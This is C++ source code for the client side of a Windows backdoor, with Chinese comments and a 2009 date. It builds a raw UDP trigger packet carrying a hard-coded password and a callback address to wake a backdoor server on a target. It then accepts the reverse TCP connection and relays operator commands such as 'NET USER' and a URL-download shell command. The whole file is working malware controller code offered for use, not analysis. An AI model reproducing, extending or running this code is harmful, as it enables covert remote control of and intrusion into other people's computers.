//////////////////////////////////////////////////////////////////////////
//FileName:	Client	
//Data:		2009-04-06
//REM:		BackDoor客户端
//////////////////////////////////////////////////////////////////////////
#include "Protocol.h"
#include <stdio.h>
#include <stdlib.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <iostream>
using namespace std;
#pragma comment(lib,"WS2_32.lib")
//////////////////////////////////////////////////////////////////////////
//宏定义部分
//////////////////////////////////////////////////////////////////////////
//目标IP和源IP根据自身情况设置，注意不能设置为伪IP(例如 127.0.0.1)
#define DESTIP	"10.253.217.63"
#define SRCIP	"10.253.217.48"
//目标端口和源端口可以随意设，发送原始UDP时端口不影响。
#define DESTPORT	1715
#define SRCPORT		1517
//反弹端口
#define SOURCEPORT	"1517"
//连接密码
#define PASSWORD	"BackDoor-0xQo"

#define BACKLOG	2

//////////////////////////////////////////////////////////////////////////
//函数声明部分
//////////////////////////////////////////////////////////////////////////
//发送UDP包，启动后门服务端
BOOL SendUdp(void);
//CHECKSUM生成
int CheckSum(USHORT* buf,int size);
//UDP CHECKSUM生成
void UdpCheckSum(IP_HEADER* pIphdr,UDP_HEADER* pUdphdr,char* payload,int payloadlen);
//后门客户端启动入口
BOOL ClientEntry(void);


int main()
{
	HANDLE	h;

	//启动后门线程
	h = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)ClientEntry,NULL,NULL,NULL);
	if (h==NULL)
	{
		return -1;
	}

	//客户端线程
	h = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)SendUdp,NULL,NULL,NULL);
	if (h==NULL)
	{
		return -1;
	}

	//主线程死循环
	while (TRUE)
	{
		Sleep(10000);
	}

	return 0;
}

//////////////////////////////////////////////////////////////////////////
//发送UDP包，启动后门服务端
//////////////////////////////////////////////////////////////////////////
BOOL SendUdp(void)
{
	WSADATA	wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);

	char szMsg[1024] = {0};
	memset(szMsg,0,sizeof(szMsg));
	//启发包配置
	strcat(szMsg,PASSWORD);
	szMsg[strlen(szMsg)] = '|';
	strcat(szMsg,SRCIP);
	szMsg[strlen(szMsg)] = ':';
	strcat(szMsg,SOURCEPORT);

	int nMsgLen = strlen(szMsg);


	SOCKET	sRaw = socket(AF_INET,SOCK_RAW,IPPROTO_UDP);

	BOOL bIncl = TRUE;
	setsockopt(sRaw,IPPROTO_IP,IP_HDRINCL,(char*)&bIncl,sizeof(bIncl));

	char buf[1024] = {0};

	IP_HEADER *pIphdr = (IP_HEADER*)buf;
	pIphdr->Verlen = ( 4<<4 | sizeof(IP_HEADER)/sizeof(ULONG) );
	pIphdr->TotalLen = htons(sizeof(IP_HEADER)+sizeof(UDP_HEADER)+nMsgLen);
	pIphdr->ttl = 128;
	pIphdr->proto = IPPROTO_UDP;
	(pIphdr->SrcIp).S_un.S_addr = inet_addr(SRCIP);
	(pIphdr->DestIp).S_un.S_addr = inet_addr(DESTIP);
	pIphdr->checksum = CheckSum((USHORT*)pIphdr,sizeof(IP_HEADER));

	UDP_HEADER	*pUdphdr = (UDP_HEADER*)&buf[sizeof(IP_HEADER)];
	pUdphdr->SrcPort	= htons(SRCPORT);
	pUdphdr->DestPort = htons(DESTPORT);
	pUdphdr->Checksum = 0;

	char* pData = &buf[sizeof(IP_HEADER)+sizeof(UDP_HEADER)];
	memcpy(pData,szMsg,nMsgLen);

	UdpCheckSum(pIphdr,pUdphdr,pData,nMsgLen);

	//设置目的地址
	SOCKADDR_IN	addr = {0};
	addr.sin_family = AF_INET;
	addr.sin_port = htons(DESTPORT);
	addr.sin_addr.S_un.S_addr = inet_addr(DESTIP);

	//发送原始UDP封包
	int ret;
	//默认循环发送10次,注意根据测试环境更改
	for (int i=0;i<10;i++)
	{
		Sleep(1000);

		ret = sendto(sRaw,buf,sizeof(IP_HEADER)+sizeof(UDP_HEADER)+nMsgLen,0,(sockaddr*)&addr,sizeof(addr));
		if (ret == SOCKET_ERROR)
		{
			char err[1024] = {0};
			sprintf(err,"sendto() Failed: %d\n",WSAGetLastError());
			MessageBox(NULL,err,NULL,NULL);
			return FALSE;
		}
	}
	closesocket(sRaw);
	
	//MessageBox(NULL,"Send Udp OK!",NULL,NULL);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//CheckSum生成
//////////////////////////////////////////////////////////////////////////
int CheckSum(USHORT* buf,int size)
{
	ULONG	cksum = 0;
	while (size>1)
	{
		cksum += *buf++;
		size -= sizeof(USHORT);
	}

	if (size)
	{
		cksum += *buf++;
		size -= sizeof(USHORT);
	}

	cksum = (cksum>>16) + (cksum&0xFFFF);
	cksum += (cksum>>16);

	return	(USHORT)(~cksum);
}

//////////////////////////////////////////////////////////////////////////
//UDP CHECKSUM生成
//////////////////////////////////////////////////////////////////////////
void UdpCheckSum(IP_HEADER* pIphdr,UDP_HEADER* pUdphdr,char* payload,int payloadlen)
{
	char	buf[1024];
	char*	pbuf = buf;
	int		chksumlen = 0;
	ULONG	zero = 0;

	memcpy(pbuf,&pIphdr->SrcIp,sizeof(pIphdr->SrcIp));
	pbuf += sizeof(pIphdr->SrcIp);
	chksumlen += sizeof(pIphdr->SrcIp);

	memcpy(pbuf,&pIphdr->DestIp,sizeof(pIphdr->DestIp));
	pbuf += sizeof(pIphdr->DestIp);
	chksumlen += sizeof(pIphdr->DestIp);

	//包含8位0域
	memcpy(pbuf,&zero,1);
	pbuf += 1;
	chksumlen += 1;

	//协议
	memcpy(pbuf,&pIphdr->proto,sizeof(pIphdr->proto));
	pbuf += sizeof(pIphdr->proto);
	chksumlen += sizeof(pIphdr->proto);

	//UDP长度
	memcpy(pbuf,&pUdphdr->Length,sizeof(pUdphdr->Length));
	pbuf += sizeof(pUdphdr->Length);
	chksumlen += sizeof(pUdphdr->Length);

	//UDP源端口号
	memcpy(pbuf,&pUdphdr->SrcPort,sizeof(pUdphdr->SrcPort));
	pbuf += sizeof(pUdphdr->SrcPort);
	chksumlen += sizeof(pUdphdr->SrcPort);

	//UDP目的端口号
	memcpy(pbuf,&pUdphdr->DestPort,sizeof(pUdphdr->DestPort));
	pbuf += sizeof(pUdphdr->DestPort);
	chksumlen += sizeof(pUdphdr->DestPort);

	//又是UDP长度
	memcpy(pbuf,&pUdphdr->Length,sizeof(pUdphdr->Length));
	pbuf += sizeof(pUdphdr->Length);
	chksumlen += sizeof(pUdphdr->Length);

	//16位的UDP校验和，置0
	memcpy(pbuf,&zero,sizeof(USHORT));
	pbuf += sizeof(USHORT);
	chksumlen += sizeof(USHORT);

	//净荷
	memcpy(pbuf,payload,payloadlen);
	pbuf += payloadlen;
	chksumlen += payloadlen;

	//补齐到下一个16位边界
	for (int i=0;i<payloadlen%2;i++)
	{
		*pbuf = '\0';
		pbuf++;
		chksumlen++;
	}

	//计算校验和，将结果填充到UDP头部
	pUdphdr->Checksum = CheckSum((USHORT*)buf,chksumlen);
}


//////////////////////////////////////////////////////////////////////////
//后门客户端启动入口
//////////////////////////////////////////////////////////////////////////
BOOL ClientEntry(void)
{
	WSADATA	wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);

	SOCKET	sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	SOCKADDR_IN	addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(SRCPORT);
	addr.sin_addr.s_addr = ADDR_ANY;

	int ret = 0;
	ret = bind(sockfd,(sockaddr*)&addr,sizeof(addr));
	ret = listen(sockfd,BACKLOG);

	int size = sizeof(addr);

	SOCKET new_fd = accept(sockfd,(sockaddr*)&addr,&size);

	//连接成功时显示
	cout<<"     -------------------------*******************-------------------------"<<endl; 
	cout<<"     -                                                                   -"<<endl; 
	cout<<"     -                             BackDoor                              -"<<endl; 
	cout<<"     -                    CMD命令：  CMD + (NET USER)                    -"<<endl; 
	cout<<"     -                  SHELL命令：  SHELL + (UrlDown xx xx)             -"<<endl; 
	cout<<"     -                                                                   -"<<endl; 
	cout<<"     -------------------------*******************-------------------------"<<endl<<endl; 

	char recvBuf[1024*10] = {0};
	char sendBuf[1024] = {0};

	while (TRUE)
	{
		while (TRUE)
		{
			memset(recvBuf,0,sizeof(recvBuf));
			ret = recv(new_fd,recvBuf,sizeof(recvBuf),0);
			if (ret==-1)
			{
				cout<<"Socket Disconnect!\n"<<endl;
				return FALSE;
			}

			if (strcmp(recvBuf,"BackDoor\\>")==0)
			{
				cout<<recvBuf;
				break;
			}

			cout<<recvBuf<<endl;
		}
		memset(sendBuf,0,sizeof(sendBuf));
		cin.getline(sendBuf,sizeof(sendBuf),'\n');
		send(new_fd,sendBuf,strlen(sendBuf),0);
	}

	return TRUE;
}
